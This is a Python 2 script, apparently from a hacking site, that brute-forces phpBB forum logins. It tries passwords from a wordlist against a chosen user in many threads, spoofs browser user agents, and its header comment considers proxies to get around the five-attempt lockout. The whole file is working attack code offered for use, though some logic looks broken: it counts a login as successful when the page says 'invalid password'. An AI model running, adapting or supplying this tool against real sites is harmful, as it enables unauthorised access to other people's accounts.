#!usr/bin/python
#phpBB Brute Forcer POC
#POC because of the 5 login attempts for 30 min, proxies?
#
#To use this script you need ClientCookie and Client Form.
#http://wwwsearch.sourceforge.net/ClientCookie/src/ClientCookie-1.0.3.tar.gz
#http://wwwsearch.sourceforge.net/ClientForm/src/ClientForm-0.1.17.tar.gz
#To install the package, run the following command:
#python setup.py build
#then (with appropriate permissions)
#python setup.py install
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, socket, httplib, re
try:
	sys.path.append('ClientCookie-1.0.3')
	import ClientCookie
	sys.path.append('ClientForm-0.1.17')
	import ClientForm
except(ImportError):
	print "\nTo use this script you need ClientCookie and Client Form."
	print "Read the top intro for instructions.\n"
	sys.exit(1)
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./phpBBbrute.py <server> <user> <wordlist>"
	sys.exit(1)

try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com phpBBBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] User:",sys.argv[2]
print "[+] Words Loaded:",len(words),"\n"

headers = ["Mozilla/5.0 (compatible)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", "Windows-RSS-Platform/1.0 (MSIE 7.0; Windows NT 5.1)", "Windows NT 6.0 (MSIE 7.0)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", "Windows NT 4.0 (MSIE 5.0)"]
wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "Reloading Wordlist\n"
		reloader()
		value = random.sample(words,  1)
		
	lock.release()
	return value[0]
		
class Worker(threading.Thread):
	
	def run(self):
		global success
		value = getword()
		try:
			print "-"*12
			print "User:",sys.argv[2],"Password:",value
			cookieJar = ClientCookie.CookieJar()
			opener = ClientCookie.build_opener(ClientCookie.HTTPCookieProcessor(cookieJar))
			opener.addheaders = [("User-agent", random.sample(headers,  1)[0])]
			ClientCookie.install_opener(opener)
			fp = ClientCookie.urlopen(sys.argv[1])
			forms = ClientForm.ParseResponse(fp)
			form = forms[0]
			form["username"] = sys.argv[2] 
			form["password"] = value      
			fp = ClientCookie.urlopen(form.click())
			site = fp.readlines()
			for line in site:
				if re.search("invalid password", line.lower()) != None:
					print "\tSuccessful Login:", value
					print line
					success =  value
					sys.exit(1)
				if re.search("The maximum number of 5 login attempts has been exceeded.",line):
					print "Attempts exceeded" 
			fp.close()
		except(socket.gaierror), msg: 
			pass
 
for i in range(len(words)):
	work = Worker()
	work.start()
	time.sleep(1)
time.sleep(3)
try:
	if success:
		print "\n\n[+] Successful Login:",sys.argv[1]
		print "[+] User:",sys.argv[2]," Password:",success
except(NameError):
	print "\n[+] Couldn't find correct password"
	pass
print "\n[+] Done\n"
